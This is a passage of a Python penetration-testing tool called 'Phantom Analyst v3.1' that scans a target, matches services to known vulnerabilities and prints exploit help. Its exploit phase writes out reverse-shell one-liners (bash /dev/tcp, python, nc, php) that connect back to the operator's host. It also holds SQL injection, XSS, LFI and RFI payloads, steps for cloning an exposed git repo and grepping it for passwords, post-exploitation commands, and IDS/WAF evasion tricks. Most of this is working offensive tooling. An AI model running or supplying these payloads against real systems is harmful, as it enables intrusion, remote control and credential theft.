        print("  " + B + port + "/udp" + X + " " +
              W + svc.ljust(12) + X + DM + ver.strip()[:40] + X)

    if xss_verified:
        combined += " xss reflected cross-site scripting "
    if sqli_verified:
        combined += " sql injection sqli database error "

    # FIX 3: only add ssl keyword to combined if weak ssl is confirmed
    if weak_ssl:
        combined += " sslv2 sslv3 tlsv1.0 weak cipher "

    log("Scan complete. TCP ports: " + str(len(unique_ports)) +
        " | Dirs found: " + str(len(found_dirs)), G)
    return combined, web_out, unique_ports, found_dirs, xss_verified, sqli_verified, weak_ssl

# ═══════════════════════════════════════════════════════════
# PHASE 2: TRIAGE AND MATCHING
# FIX 2: Port-gated matching — vulns with require_port only
#         fire when that port appears in the actual port list.
# ═══════════════════════════════════════════════════════════
def phase2_triage(nmap_out, web_out, ports, found_dirs, xss_v, sqli_v, weak_ssl, target):
    section("PHASE 2  TRIAGE AND VULNERABILITY MATCHING", G)
    findings = []
    seen = set()
    combined = (nmap_out + web_out).lower()

    # Build set of open port numbers for FIX 2 checks
    open_ports = {port for port, svc, ver in ports}

    for port, svc, ver in ports:
        combined += " " + svc.lower() + " " + ver.lower()

    # Pre-scan: find which specific-version vulns matched, so we can
    # suppress their generic parent entries and avoid duplicate findings.
    # E.g. if "dnsmasq 2.5" matched, skip generic "dnsmasq" and "domain".
    specific_ports_claimed = {}  # port -> most-specific title found so far
    GENERIC_SUPERSEDED_BY = {
        # generic key -> list of specific keys that supersede it
        "dnsmasq": ["dnsmasq 2.5"],
        "domain":  ["dnsmasq 2.5", "dnsmasq"],
        "open port 3306": ["mysql 5.0"],
        "anonymous ftp": ["vsftpd 2.3.4"],
    }

    def is_superseded(keyword):
        """Return True if a more specific vuln for this keyword already matched."""
        supersedes = GENERIC_SUPERSEDED_BY.get(keyword, [])
        for specific_key in supersedes:
            specific_vuln = VULN_DB.get(specific_key, {})
            if (specific_key.lower() in combined and
                    (not specific_vuln.get("require_port") or
                     specific_vuln.get("require_port") in open_ports)):
                return True
        return False

    for keyword, vuln in VULN_DB.items():
        if keyword.lower() not in combined:
            continue
        if vuln["title"] in seen:
            continue

        # FIX 2: If the vuln requires a specific port, verify it's open
        required_port = vuln.get("require_port")
        if required_port and required_port not in open_ports:
            log("Skipping '" + vuln["title"] + "' — port " +
                required_port + " not open", DM)
            continue

        # FIX: skip generic entries superseded by a more specific match
        if is_superseded(keyword):
            log("Skipping '" + vuln["title"] + "' — superseded by more specific finding", DM)
            continue

        seen.add(vuln["title"])
        f = {"id": "F-" + str(len(findings) + 1).zfill(3)}
        f.update(vuln)

        if "xss" in keyword and xss_v:
            f["verified"] = True
        elif "sql" in keyword and sqli_v:
            f["verified"] = True
        else:
            f["verified"] = False
        findings.append(f)

    # Git exposure (directory-based, already verified by HTTP status)
    if any("/.git" in d[0] for d in found_dirs):
        if "Git Repository Exposed" not in seen:
            findings.append({
                "id": "F-" + str(len(findings) + 1).zfill(3),
                "title": "Git Repository Exposed",
                "severity": "HIGH", "cvss": 8.0, "cve": "CWE-538",
                "owasp": "A05:2021 Security Misconfiguration",
                "mitre": "T1083 File and Directory Discovery",
                "description": "Git repo exposed. Source code and credentials accessible.",
                "remediation": "Block .git access in web server config.",
                "poc": "curl http://" + target + "/.git/HEAD",
                "next_steps": [
                    "git clone http://" + target + "/.git ./stolen_repo",
                    "git log --oneline in stolen_repo",
                    "grep -r password stolen_repo",
                ],
                "verified": True,
            })

    if any("/phpmyadmin" in d[0] for d in found_dirs) and "phpMyAdmin Exposed" not in seen:
        f = {"id": "F-" + str(len(findings) + 1).zfill(3), "verified": True}
        f.update(VULN_DB["phpmyadmin"])
        findings.append(f)

    for f in findings:
        sc = sev_color(f["severity"])
        verified_tag = G + " [VERIFIED]" + X if f.get("verified") else Y + " [UNVERIFIED]" + X
        print("  " + sc + BLD + "[" + f["severity"] + "]" + X +
              " " + W + f["id"] + " - " + f["title"] + X + verified_tag)
        print("    " + DM + "CVSS: " + str(f["cvss"]) + " | " + f["cve"] + X + "\n")

    log("Total findings: " + str(len(findings)) +
        " | Verified: " + str(sum(1 for f in findings if f.get("verified"))), G)
    return findings

# ═══════════════════════════════════════════════════════════
# PHASE 3: INTEL ENRICHMENT
# FIX 1: Attack chains filtered by actual findings
# ═══════════════════════════════════════════════════════════
def phase3_intel(findings, ports):
    section("PHASE 3  INTELLIGENCE ENRICHMENT", B)
    counts = {}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    print("  " + R + BLD + "CRITICAL: " + str(counts.get("CRITICAL", 0)) + X +
          "  " + Y + "HIGH: " + str(counts.get("HIGH", 0)) + X +
          "  " + B + "MEDIUM: " + str(counts.get("MEDIUM", 0)) + X +
          "  " + G + "LOW: " + str(counts.get("LOW", 0)) + X + "\n")

    log("CVE and MITRE Mapping:", C)
    for f in findings:
        print("  " + W + f["id"] + X + " -> " + Y + f["cve"] + X +
              " | " + C + f["mitre"] + X)

    # FIX 1: only show chains that match actual findings
    relevant_chains = get_relevant_chains(findings)
    print()
    if relevant_chains:
        log("Attack Chain Analysis (" + str(len(relevant_chains)) + " applicable):", C)
        for chain in relevant_chains:
            print("\n  " + R + BLD + chain["id"] + ": " + chain["name"] + X)
            for step in chain["steps"]:
                print("    " + DM + step + X)
            print("  " + Y + "Impact: " + chain["impact"] + X)
            print("  " + DM + "Tools: " + chain["tools"] + X)
    else:
        log("No attack chains applicable based on confirmed findings.", DM)

    print()
    log("Privilege Escalation Paths:", C)
    privesc = [f for f in findings if f["severity"] in ("CRITICAL", "HIGH")]
    if privesc:
        for f in privesc[:4]:
            print("  " + R + "->" + X + " " + f["title"])
    else:
        print("  " + DM + "No direct privesc paths found" + X)
    return counts

# ═══════════════════════════════════════════════════════════
# PHASE 4: EXPLOIT ASSISTANCE WITH DYNAMIC PAYLOADS
# ═══════════════════════════════════════════════════════════
def phase4_exploit(findings, target):
    section("PHASE 4  EXPLOIT ASSISTANCE + DYNAMIC PAYLOADS", R)
    host = target.replace("*.", "").split("/")[0].strip()

    log("Auto-injecting LHOST=" + LHOST + " into all payloads", G)

    top = [f for f in findings if f["severity"] in ("CRITICAL", "HIGH")]
    if not top:
        top = findings
    for f in top[:5]:
        sc = sev_color(f["severity"])
        verified_tag = G + " [VERIFIED]" + X if f.get("verified") else Y + " [UNVERIFIED]" + X
        print(sc + BLD + "[" + f["severity"] + "] " + f["id"] +
              " - " + f["title"] + X + verified_tag)
        print(DM + "-" * 55 + X)

        poc = f["poc"].replace("TARGET", host).replace("LHOST", LHOST)
        print(Y + "PoC:" + X)
        for line in poc.split("|"):
            print("  " + C + "$ " + line.strip() + X)

        print("\n" + Y + "Dynamic Payloads (LHOST=" + LHOST + "):" + X)
        rev_shells = [
            "bash -i >& /dev/tcp/" + LHOST + "/4444 0>&1",
            "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"" + LHOST + "\",4444));subprocess.call([\"/bin/sh\"],stdin=s,stdout=s,stderr=s)'",
            "nc -e /bin/sh " + LHOST + " 4444",
            "php -r '$sock=fsockopen(\"" + LHOST + "\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        ]
        for rs in rev_shells:
            print("  " + G + rs + X)

        print("\n" + Y + "Burp Suite Template:" + X)
        print(DM + "  GET /vuln?param=1 HTTP/1.1")
        print("  Host: " + host)
        print("  User-Agent: Mozilla/5.0")
        print("  X-Forwarded-For: 127.0.0.1\n" + X)

        payloads = get_payloads(f["title"])
        if payloads:
            print(Y + "Test Payloads:" + X)
            for p in payloads:
                print("  " + G + p + X)
        print()

def get_payloads(title):
    t = title.lower()
    if "sql" in t:
        return ["'", "1' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--",
                "admin'--", "1; DROP TABLE users--"]
    elif "xss" in t:
        return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>"]
    elif "lfi" in t:
        return ["../../../../etc/passwd", "../../../../etc/shadow",
                "/proc/self/environ",
                "php://filter/read=convert.base64-encode/resource=index.php"]
    elif "ftp" in t or "backdoor" in t:
        return [":)", "anonymous", "admin", "root"]
    elif "directory" in t:
        return ["/admin/", "/backup/", "/config/", "/.git/", "/.env"]
    elif "rfi" in t:
        return ["http://" + LHOST + "/shell.txt",
                "http://" + LHOST + "/shell.php"]
    return []

# ═══════════════════════════════════════════════════════════
# PHASE 5: PROFESSIONAL REPORT
# ═══════════════════════════════════════════════════════════
def phase5_report(findings, counts, target, ports):
    section("PHASE 5  PROFESSIONAL REPORT", C)
    risk = ("CRITICAL" if counts.get("CRITICAL", 0) > 0 else
            "HIGH" if counts.get("HIGH", 0) > 0 else
            "MEDIUM" if counts.get("MEDIUM", 0) > 0 else "LOW")
    rc = sev_color(risk)
    verified_count = sum(1 for f in findings if f.get("verified"))

    print(rc + BLD + "OVERALL RISK POSTURE: " + risk + X + "\n")
    exec_summary = (
        "The security assessment of " + target + " identified " +
        str(len(findings)) + " vulnerabilities (" +
        str(counts.get("CRITICAL", 0)) + " Critical, " +
        str(counts.get("HIGH", 0)) + " High, " +
        str(counts.get("MEDIUM", 0)) + " Medium). " +
        str(verified_count) + " findings were actively verified. " +
        "Overall risk posture: " + risk + "."
    )
    print(W + BLD + "EXECUTIVE SUMMARY" + X)
    print(DM + "-" * 55 + X)
    print(W + exec_summary + X + "\n")

    print(W + BLD + "FINDINGS TABLE" + X)
    print(DM + "-" * 55 + X)
    print(BLD + "ID       SEV        CVSS  VERIFIED  TITLE" + X)
    print(DM + "-" * 55 + X)
    for f in findings:
        sc = sev_color(f["severity"])
        vt = G + "YES" + X if f.get("verified") else Y + "NO " + X
        print(W + f["id"] + "  " + X + sc + f["severity"].ljust(10) + X +
              Y + str(f["cvss"]).ljust(6) + X + vt + "      " + f["title"][:30])

    if ports:
        print("\n" + W + BLD + "OPEN PORTS" + X)
        print(DM + "-" * 55 + X)
        for port, svc, ver in ports:
            print("  " + C + port + "/tcp" + X + " " +
                  W + svc.ljust(12) + X + DM + ver[:30] + X)

    print("\n" + W + BLD + "REMEDIATION ROADMAP" + X)
    print(DM + "-" * 55 + X)
    step = 1
    for label, sev, color in [
        ("IMMEDIATE 0-48h", "CRITICAL", R),
        ("SHORT TERM 1-2 weeks", "HIGH", Y),
        ("MEDIUM TERM 1 month", "MEDIUM", B),
    ]:
        items = [f for f in findings if f["severity"] == sev]
        if items:
            print(color + BLD + label + ":" + X)
            for f in items:
                print("  " + str(step) + ". " + f["remediation"])
                step += 1
            print()

    print(G + BLD + "GENERAL HARDENING:" + X)
    print("  " + str(step) + ". Deploy Web Application Firewall")
    print("  " + str(step+1) + ". Enable centralized logging and SIEM")
    print("  " + str(step+2) + ". Conduct quarterly penetration tests")
    return risk, exec_summary

# ═══════════════════════════════════════════════════════════
# PHASE 6: SMART NEXT STEPS
# ═══════════════════════════════════════════════════════════
def phase6_next_steps(findings, target):
    section("PHASE 6  SMART NEXT STEPS", Y)
    host = target.replace("*.", "").split("/")[0].strip()

    print(W + BLD + "PER FINDING NEXT STEPS:" + X + "\n")
    for f in findings:
        sc = sev_color(f["severity"])
        print(sc + BLD + "[" + f["severity"] + "] " + f["id"] +
              " - " + f["title"] + X)
        for i, step in enumerate(f.get("next_steps", []), 1):
            cmd = step.replace("TARGET", host).replace("LHOST", LHOST)
            print("  " + Y + str(i) + "." + X + " " + cmd)
        print()

    print(W + BLD + "GENERAL RECON:" + X)
    recon = [
        "subfinder -d " + host + " -o subs.txt",
        "amass enum -d " + host,
        "nmap -sV -sC -p- " + host,
        "theHarvester -d " + host + " -b all",
        "whois " + host,
        "dnsrecon -d " + host,
    ]
    for i, s in enumerate(recon, 1):
        print("  " + C + str(i) + "." + X + " " + s)

    print("\n" + W + BLD + "WEB TESTING:" + X)
    web = [
        "nikto -h http://" + host,
        "gobuster dir -u http://" + host + " -w /usr/share/wordlists/dirb/common.txt",
        "whatweb http://" + host,
        "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://" + host + "/FUZZ",
        "dirsearch -u http://" + host,
    ]
    for i, s in enumerate(web, 1):
        print("  " + C + str(i) + "." + X + " " + s)

    print("\n" + W + BLD + "POST EXPLOITATION:" + X)
    post = [
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "find / -perm -4000 2>/dev/null",
        "sudo -l",
        "cat /etc/crontab",
        "ss -tulnp",
        "cat /etc/passwd | grep /bin/bash",
        "env && history",
        "linpeas.sh for automated privesc check",
    ]
    for i, s in enumerate(post, 1):
        print("  " + C + str(i) + "." + X + " " + s)

    print("\n" + G + BLD + "INSTALL MISSING TOOLS:" + X)
    print("  " + G + "$ sudo apt install nmap nikto gobuster sqlmap hydra -y" + X)
    print("  " + G + "$ sudo apt install metasploit-framework exploitdb -y" + X)
    print("  " + G + "$ sudo apt install wpscan dirsearch sslscan masscan -y" + X)

# ═══════════════════════════════════════════════════════════
# PHASE 7: FIREWALL BYPASS
# ═══════════════════════════════════════════════════════════
def phase7_firewall_bypass(target):
    section("PHASE 7  FIREWALL AND WAF BYPASS", R)
    host = target.replace("*.", "").split("/")[0].strip()

    print(W + BLD + "1. STEALTH PORT SCAN BYPASS:" + X)
    for i, t in enumerate([
        "nmap -sS " + host + "  (SYN stealth)",
        "nmap -sF " + host + "  (FIN scan)",
        "nmap -sX " + host + "  (XMAS scan)",
        "nmap -sN " + host + "  (NULL scan)",
        "nmap -f " + host + "   (fragment packets)",
        "nmap -D RND:10 " + host + "  (decoy scan)",
        "nmap --source-port 53 " + host + "  (spoof DNS port)",
        "nmap -T1 --scan-delay 5s " + host + "  (slow evasion)",
        "nmap --data-length 25 " + host + "  (random data padding)",
    ], 1):
        print("  " + Y + str(i) + "." + X + " " + C + t + X)

    print("\n" + W + BLD + "2. WAF DETECTION AND BYPASS:" + X)
    for i, t in enumerate([
        "wafw00f http://" + host + "  (detect WAF type)",
        "X-Forwarded-For: 127.0.0.1  (header injection)",
        "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "Change User-Agent to Googlebot/2.1",
        "Use URL encoding %27 instead of quote",
        "Use double encoding %2527",
        "Case variation SeLeCt instead of SELECT",
        "SQL comments SE/**/LECT",
        "sqlmap --tamper=space2comment,between,randomcase -u http://" + host,
    ], 1):
        print("  " + Y + str(i) + "." + X + " " + C + t + X)

    print("\n" + R + BLD + "NOTE: Authorized targets only." + X + "\n")

# ═══════════════════════════════════════════════════════════
# SAVE REPORT
# FIX 1: Attack chains in report also filtered by findings
# ═══════════════════════════════════════════════════════════
def save_report(target, findings, counts, ports, risk, exec_summary):
    os.makedirs(REPORT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    md_path = os.path.join(REPORT_DIR, "phantom_" + ts + ".md")
    json_path = os.path.join(REPORT_DIR, "phantom_" + ts + ".json")

    lines = [
        "# PHANTOM ANALYST v3.1 Report",
        "**Target:** " + target + " | **Risk:** " + risk,
        "**LHOST:** " + LHOST,
        "**Date:** " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "**Total Findings:** " + str(len(findings)),
        "", "---", "", "## Executive Summary", "", exec_summary, "",
        "---", "", "## Findings Summary",
        "| ID | Title | Severity | CVSS | Verified | CVE |",
        "|---|---|---|---|---|---|",
    ]
    for f in findings:
        v = "YES" if f.get("verified") else "NO"
        lines.append("| " + f["id"] + " | " + f["title"] + " | " +
                     f["severity"] + " | " + str(f["cvss"]) +
                     " | " + v + " | " + f["cve"] + " |")

    lines += ["", "---", "## Detailed Findings", ""]
    for f in findings:
        lines += [
            "### " + f["id"] + " - " + f["title"],
            "**Severity:** " + f["severity"] + " | **CVSS:** " + str(f["cvss"]),
            "**Verified:** " + ("YES" if f.get("verified") else "NO"),
            "**CVE:** " + f["cve"],
            "**OWASP:** " + f["owasp"],
            "**MITRE:** " + f["mitre"],
            "", "**Description:** " + f["description"],
            "**Remediation:** " + f["remediation"],
            "", "**PoC:** " + f["poc"].replace("LHOST", LHOST),
            "", "**Next Steps:**",
        ]
        for i, step in enumerate(f.get("next_steps", []), 1):
            lines.append(str(i) + ". " + step.replace("LHOST", LHOST))
        lines.append("")

    # FIX 1: only write relevant attack chains to report
    relevant_chains = get_relevant_chains(findings)
    if relevant_chains:
        lines += ["---", "", "## Attack Chains", ""]
        for chain in relevant_chains:
            lines.append("### " + chain["id"] + " - " + chain["name"])
            for step in chain["steps"]:
                lines.append("- " + step)
            lines += ["**Impact:** " + chain["impact"], ""]
    else:
        lines += ["---", "", "## Attack Chains", "",
                  "_No attack chains applicable for confirmed findings._", ""]

    lines += ["---", "*Generated by Phantom Analyst v3.1*"]

    with open(md_path, "w") as fh:
        fh.write("\n".join(lines))
    with open(json_path, "w") as fh:
        json.dump({"target": target, "risk": risk, "lhost": LHOST,
                   "findings": findings, "counts": counts}, fh, indent=2)
    return md_path, json_path

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(description="Phantom Analyst v3.1")
    parser.add_argument("-t", "--target", help="Target IP or domain")
    parser.add_argument("--shell", action="store_true",
                        help="Start reverse shell listener on port 4444")
    parser.add_argument("--shell-port", type=int, default=4444,
                        help="Reverse shell listener port (default 4444)")
    parser.add_argument("--no-dep-check", action="store_true",
                        help="Skip dependency check")
    args = parser.parse_args()

    banner()
    get_lhost()

    if not args.no_dep_check:
        check_dependencies()

    if args.shell:
        log("Starting reverse shell listener on port " +
            str(args.shell_port), Y)
        start_shell_listener(args.shell_port)

    if args.target:
        target = args.target
    else:
        print(Y + "Enter target IP or domain:" + X)
        target = input(C + "Target > " + X).strip()
        if not target:
            log("No target provided. Exiting.", R)
            sys.exit(1)

    log("Starting Phantom Analyst v3.1 on: " + target, G)
    print(DM + "All 7 phases running. Output streams live.\n" + X)

    nmap_out, web_out, ports, found_dirs, xss_v, sqli_v, weak_ssl = phase1_scan(target)
    findings = phase2_triage(nmap_out, web_out, ports, found_dirs, xss_v, sqli_v, weak_ssl, target)
    counts = phase3_intel(findings, ports)
    phase4_exploit(findings, target)
    risk, exec_summary = phase5_report(findings, counts, target, ports)
    phase6_next_steps(findings, target)
    phase7_firewall_bypass(target)

    section("SAVING REPORT", G)
    md_path, json_path = save_report(target, findings, counts, ports, risk, exec_summary)

    section("COMPLETE", G)
    print(G + BLD + "All 7 phases complete!" + X)
    print(W + "Findings  : " + Y + str(len(findings)) + X)
    print(W + "Verified  : " + G + str(sum(1 for f in findings if f.get("verified"))) + X)
    print(W + "LHOST     : " + C + LHOST + X)
    print(W + "Risk      : " + sev_color(risk) + BLD + risk + X)
    print(W + "Report    : " + C + md_path + X)
    print(W + "JSON      : " + C + json_path + X)
    print(DM + "\nView: cat " + md_path + "\n" + X)

if __name__ == "__main__":
    main()
